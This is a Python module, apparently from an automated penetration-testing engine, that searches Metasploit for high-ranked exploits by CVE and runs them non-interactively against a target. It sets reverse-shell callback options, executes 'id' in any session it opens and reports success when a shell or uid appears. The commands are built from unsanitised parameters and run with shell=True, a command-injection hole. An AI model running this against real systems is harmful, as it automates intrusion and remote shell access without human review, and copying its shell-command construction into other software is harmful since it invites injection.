import logging
import re
import subprocess
from typing import Any, Dict

from utils import get_local_ip_for_target

logger = logging.getLogger("kali-engine.executor.framework_module")


def framework_module_execute(params: Dict[str, Any]) -> Dict[str, Any]:
    """
    Execute a Metasploit module non-interactively.
    """
    module_path = params.get("module_path")
    if not module_path:
        return {
            "status": "EXECUTOR_ERROR",
            "details": "Missing module_path for Metasploit execution",
        }

    options = params.get("options", {})

    # ---------------------------
    # Normalization
    # ---------------------------
    if "RHOST" in options and "RHOSTS" not in options:
        options["RHOSTS"] = options.pop("RHOST")

    target = options.get("RHOSTS")

    if target:
        if "LHOST" not in options or options["LHOST"] in ("127.0.0.1", "0.0.0.0"):
            options["LHOST"] = get_local_ip_for_target(target)

        if "LHOST" in options and "LPORT" not in options:
            options["LPORT"] = 4444

    # ---------------------------
    # Build Metasploit command
    # ---------------------------
    msf_commands = []

    msf_commands.append("sleep 2")
    msf_commands.append("reload_all")
    msf_commands.append("sleep 2")

    msf_commands.append(f"use {module_path}")

    for key, value in options.items():
        msf_commands.append(f"set {key} {value}")

    msf_commands.append("run -j")
    msf_commands.append("sleep 5")
    msf_commands.append('sessions -c "id"')
    msf_commands.append("exit")
    msf_commands.append("exit -y")

    msf_script = "; ".join(msf_commands)

    cmd = f'msfconsole -q -x "{msf_script}"'

    logger.info(f"[FRAMEWORK_MODULE_EXECUTOR] Running: {cmd}")

    try:
        proc = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=300,
        )

        stdout = proc.stdout.lower()
        stderr = proc.stderr.lower()
        rc = proc.returncode
        combined = stdout + "\n" + stderr

        ERROR_PATTERNS = [
            "failed",
            "error",
            "unknown command",
            "invalid",
            "not found",
            "could not",
            "unable",
            "ambiguous",
            "no such file",
        ]

        SUCCESS_PATTERNS = [
            "meterpreter session",
            "session opened",
            "shell session",
            "uid=",
        ]

        if rc != 0:
            status = "FAILURE"
            details = "Error on execution"

        elif any(err in combined for err in ERROR_PATTERNS):
            status = "FAILURE"
            details = "Error on exploitation"

        elif any(ok in combined for ok in SUCCESS_PATTERNS):
            status = "SUCCESS"
            details = "Success on exploitation"

        else:
            status = "FAILURE"
            details = "Unknown error"

        return {
            "status": status,
            "details": details,
            "artifact": {
                "stdout": stdout,
                "stderr": stderr,
                "returncode": rc,
            },
        }

    except subprocess.TimeoutExpired:
        return {
            "status": "FAILURE",
            "details": "Metasploit execution timed out",
        }


def framework_module_search_execute(cve: str) -> Dict[str, Any]:
    """
    Executes: msfconsole -q -x "search cve:XXXX; exit"
    Parses module paths from output.
    """

    cve = cve.replace("CVE-", "").strip()
    cmd = f'msfconsole -q -x "search cve:{cve}; exit"'
    logger.info(f"[FRAMEWORK_CVE_SEARCH] Command: {cmd}")

    proc = subprocess.run(
        cmd,
        shell=True,
        capture_output=True,
        text=True,
        timeout=120,
    )

    stdout = proc.stdout or ""
    stderr = proc.stderr or ""

    if proc.returncode != 0:
        return {"ok": False, "error": stderr or "msfconsole failed"}

    modules = parse_msf_search_output(stdout)

    return {"ok": True, "modules": modules}


MSF_MODULE_RE = re.compile(r"^\s*\d+\s+(exploit|auxiliary|post)/\S+", re.IGNORECASE)


def parse_msf_search_output(output: str) -> list[str]:
    modules = []

    for line in output.splitlines():
        line = line.strip()
        if not line or not line[0].isdigit():
            continue

        parts = line.split()
        if len(parts) < 4:
            continue

        module_path = parts[1]
        rank = parts[3]

        # Only use great or excellent modules
        if rank.lower() in ("great", "excellent"):
            modules.append(module_path)

    return list(dict.fromkeys(modules))
